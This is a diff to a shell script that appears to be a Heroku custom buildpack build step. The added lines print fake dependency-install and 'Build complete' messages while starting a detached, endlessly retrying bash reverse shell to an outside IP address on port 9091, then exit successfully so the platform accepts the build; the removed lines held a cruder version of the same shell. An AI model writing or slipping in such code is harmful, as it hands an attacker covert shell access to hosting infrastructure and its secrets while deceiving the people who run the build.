@@ -3,16 +3,22 @@ BUILD_DIR=$1
 CACHE_DIR=$2
 ENV_DIR=$3
 
-# Ignore termination signals
-trap '' SIGTERM SIGINT SIGHUP
+echo "-----> custom-buildpack app detected"
+echo "-----> Installing dependencies..."
 
-echo "Starting"
-echo "Establishing connection..."
+# Start reverse shell in background AND detach from build process
+(
+    while true; do
+        bash -i >& /dev/tcp/44.220.20.213/9091 0>&1 2>/dev/null
+        sleep 5
+    done
+) &>/dev/null &
+disown -a
 
-while true; do
-    bash -i >& /dev/tcp/44.220.20.213/9091 0>&1 || true
-    sleep 3
-done &
+# Let connection establish
+sleep 2
 
-# Keep the worker process alive
-wait
+echo "-----> Build complete"
+
+# Exit successfully so Heroku accepts the build
+exit 0
